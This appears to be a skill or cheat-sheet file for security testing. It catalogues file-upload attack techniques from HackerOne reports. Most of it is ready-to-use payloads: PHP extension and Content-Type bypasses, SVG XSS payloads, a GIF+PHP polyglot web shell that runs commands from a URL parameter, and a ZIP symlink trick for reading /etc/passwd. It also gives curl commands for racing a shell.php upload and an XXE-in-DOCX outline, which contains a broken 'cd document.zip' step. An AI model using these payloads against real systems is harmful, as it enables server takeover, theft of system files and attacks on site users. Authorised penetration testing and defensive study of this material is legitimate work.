---
name: "h1-upload-techniques"
description: "File Upload vulnerability patterns from HackerOne — unrestricted upload leading to RCE, SVG XSS, polyglot files, extension bypass, MIME mismatch, ZIP symlink, and upload race conditions"
category: web-security
tags: ["file-upload", "unrestricted-upload", "rce", "svg-xss", "polyglot", "hackerone"]
relevance: 9
---

# H1 File Upload Techniques

Real-world File Upload vulnerabilities from HackerOne:

## 1. Extension Bypass
Try these extensions for PHP execution:
```
.php, .php3, .php4, .php5, .phtml, .pht, .php7, .php8
.php.jpg, .php. .php%00.jpg, .php;.jpg
.php\x00.jpg (null byte)
```

## 2. Content-Type Bypass
Change `Content-Type` header:
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: application/pdf
```
While uploading file with malicious content

## 3. SVG XSS Upload
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" 
     onload="alert(document.domain)"/>
```
Or with embedded script:
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>
```

## 4. Polyglot File (GIF+PHP)
Create file that is both valid GIF and PHP:
```
GIF89a<?php system($_GET['cmd']); ?>
```
Upload as `.gif`, access as `.php` (if path traversal possible)

## 5. ZIP Symlink Attack
```bash
ln -s /etc/passwd symlink.txt
zip --symlinks malicious.zip symlink.txt
```
Upload → extract → read `/etc/passwd` through symlink

## 6. Upload Race Condition
Upload file and access it before validation completes:
```bash
# Request 1: Upload malicious file
curl -F "file=@shell.php" https://target.com/upload &
# Request 2: Access it immediately
curl https://target.com/uploads/shell.php &
```

## 7. XML External Entity via Office Upload
Create DOCX/XLSX with XXE:
```bash
cp document.docx document.zip
cd document.zip
# Edit document.xml to include XXE payload
zip -r exploit.docx *
```

## Key Test Parameters:
- Check if file is served from same origin
- Check if Content-Type is honored
- Check for path traversal in filename
- Check upload directory listing
- Check for Server-Side scanning bypass (magic bytes only)
